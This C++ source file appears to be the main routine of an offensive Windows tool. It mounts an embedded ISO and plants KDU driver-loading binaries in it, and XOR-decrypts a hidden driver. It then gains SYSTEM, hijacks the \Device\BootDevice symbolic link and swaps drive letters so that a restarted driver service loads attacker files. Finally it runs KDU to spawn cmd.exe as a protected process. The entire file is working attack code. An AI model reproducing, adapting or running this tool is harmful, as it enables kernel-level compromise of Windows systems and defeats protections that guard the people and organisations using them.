#include "common.h"
#include "DriveSwap.h"
#include "IoCdfsLib.h"
#include "resource.h"
#include <Shlwapi.h>
#include "utils.h"
#include "SvcLib.h"

int main(int argc, char* argv[]) {
	// Buffers to perform the overwrites
	unsigned char* drvx = nullptr;
	unsigned char* drv64 = nullptr;
	unsigned char* kdu = nullptr;

	// Lengths of the buffers
	int drvx_len = 0;
	int drv64_len = 0;
	int kdu_len = 0;
	
	// Overwrite result
	BOOL bSuccess = FALSE;

	// Write our ISO to the disk
	LPWSTR isoPath = UnpackFileFromResource((wchar_t*)ISO_NAME_W, IDR_ISO);

	// Get list of drives before mounting ISO
	std::vector<std::string> drives = GetListOfDrives();
	// Drive letter of mounted ISO
	std::string drivePath;

	// srand for random string generation
	srand((unsigned)time(NULL));

	// Mount the ISO
	HANDLE vhd = MountISO(ISO_NAME_A);

	for (auto drive : GetListOfDrives()) {
		bool found = false;
		for (auto drive2 : drives) {
			if (drive == drive2) {
				found = true;
				break;
			}
		}
		if (!found) {
			printf("(>) New Drive: %s\n", drive.c_str());
			drivePath = drive;
		}

	}

	if (vhd == nullptr) {
		printf("(-) Failed to mount ISO\n");
		return 1;
	}

	std::wstring wDriveLetter = std::wstring(AnsiToWide(drivePath.c_str()));
	printf("(*) Wide Drive Letter: %ws\n", wDriveLetter.c_str());

	// Get the physical drive path
	PWSTR physicalDrivePath = GetPhysicalDrivePath(vhd);
	// Extract the number from the path
	DWORD driveNumber = ExtractNumberFromPath(physicalDrivePath);
	std::wstring wDevicePath = std::wstring(physicalDrivePath).erase(0, 3);
	wDevicePath = L"\\Device" + wDevicePath;
	
	wprintf(L"(*) Physical Drive: %s\n", physicalDrivePath);
	printf("(*) Drive Number: %d\n", driveNumber);
	printf("(*) Mounted Drive Letter: %s\n", drivePath.c_str());
	getchar();
	
	// Load resources into buffers
	kdu = (unsigned char*)LoadResourceInMemory(&kdu_len, IDR_KDU_EXE);
	drv64 = (unsigned char*)LoadResourceInMemory(&drv64_len, IDR_KDU_DLL);
	drvx = (unsigned char*)LoadResourceInMemory(&drvx_len, IDR_DRVX);
	
	std::string fullKduPath = drivePath + KDU_PATH;
	std::string fullDrv64Path = drivePath + DR64_PATH;
	std::string fullDrvxPath = drivePath + DRVX_PATH;
	printf("(*) Full KDU Path: %s\n", fullKduPath.c_str());
	printf("(*) Full DRV64 Path: %s\n", fullDrv64Path.c_str());
	printf("(*) Full DRVX Path: %s\n", fullDrvxPath.c_str());

	/*
	for (int i = 0; i < 1; i++) {
		// Replace files in ISO with custom
		bSuccess = OverwriteFileWithBuffer(fullDrvxPath, drvx, drvx_len);
		if (!bSuccess) {
			printf("(-) Failed to overwrite files\n");
			DetatchVirtualImage(vhd);
			return 1;
		}

		bSuccess = CompareFileToBuffer(fullDrvxPath, drvx, drvx_len);
		if (!bSuccess) {
			printf("(-) Failed to compare files\n");
			DetatchVirtualImage(vhd);
			return 1;
		}
	}
	*/
	bSuccess = XorDecryptFile(fullDrvxPath, NULL,  (char*)"Microsoft");
	if (!bSuccess) {
		printf("(-) Failed to xor file!\n");
		DetatchVirtualImage(vhd);
		return 1;
	}

	for (int i = 0; i < 1; i++) {
		// Replace files in ISO with custom
		bSuccess = OverwriteFileWithBuffer(fullKduPath, kdu, kdu_len);
		bSuccess &= OverwriteFileWithBuffer(fullDrv64Path, drv64, drv64_len);
		if (!bSuccess) {
			printf("(-) Failed to overwrite files\n");
			DetatchVirtualImage(vhd);
			return 1;
		}
	}

	printf("\r\n(+) Everything in place. Press a button to fire...\r\n");
	getchar();

	// Get SYSTEM
	auto success = GetSystem();
	if (!success)
	{
		std::cout << "(-) Not enough privileges to elevate to SYSTEM, exiting...\n";
		DetatchVirtualImage(vhd);
		return 1;
	}

	// save the old symbolic link so that we can restore it later
	auto oldTarget = GetSymbolicLinkTarget(L"\\Device\\BootDevice");
	printf("(+) Old target: %ws\n", oldTarget.c_str());
	printf("(+) New target: %ws\n", physicalDrivePath);

	// change the symbolic link to make it point to the UEFI partition (\Device\HarddiskVolume1)
	auto status = ChangeSymlink(L"\\Device\\BootDevice", wDevicePath);

	if (status == STATUS_SUCCESS) std::cout << "(+) Successfully changed symbolic link to new target!\n";
	else
	{
		Error(RtlNtStatusToDosError(status));
		std::cout << "(-) Failed to change symbolic link, exiting...\n";
		DetatchVirtualImage(vhd);
		return 1;
	}

	getchar();
	ManageDriveLetter(L"C", L"X", oldTarget, TRUE);
	ManageDriveLetter(wDriveLetter, L"C", wDevicePath, TRUE);
	
	//std::thread serviceRestartThread(RestartDriverService);
	//serviceRestartThread.join();

	DoStopSvc(DRIVER_SERVICE_NAME);
	DoStartSvc(DRIVER_SERVICE_NAME);

	ManageDriveLetter(L"C", wDriveLetter, wDevicePath, TRUE);
	ManageDriveLetter(L"X", L"C", oldTarget, TRUE);

	// restore the symlink
	status = ChangeSymlink(L"\\Device\\BootDevice", oldTarget);
	if (status == STATUS_SUCCESS) std::cout << "(+) Successfully restored symbolic links...\n";
	else
	{
		Error(RtlNtStatusToDosError(status));
		std::cout << "(-) Failed to restore symbolic links, fix them manually!!\n";
		DetatchVirtualImage(vhd);
		return 1;
	}

	// We now have shift back to E:
	std::string cmdLine = std::string("start \"\" cmd /c ");
	cmdLine.append(fullKduPath);
	cmdLine.append(" -prv 34 -pse C:\\Windows\\System32\\cmd.exe");
	
	printf("(*) Executing: %s\r\n", cmdLine.c_str());

	getchar();

	// Using KDU to launch a PPL process with SYSTEM privileges
	system(cmdLine.c_str());

	Sleep(5000);
	// Stop the service to free the driver
	DoStopSvc(DRIVER_SERVICE_NAME);
	// Unmount the ISO
	DetatchVirtualImage(vhd);
	// Delete ISO file
	DeleteFileW(isoPath);

	return 0;
}
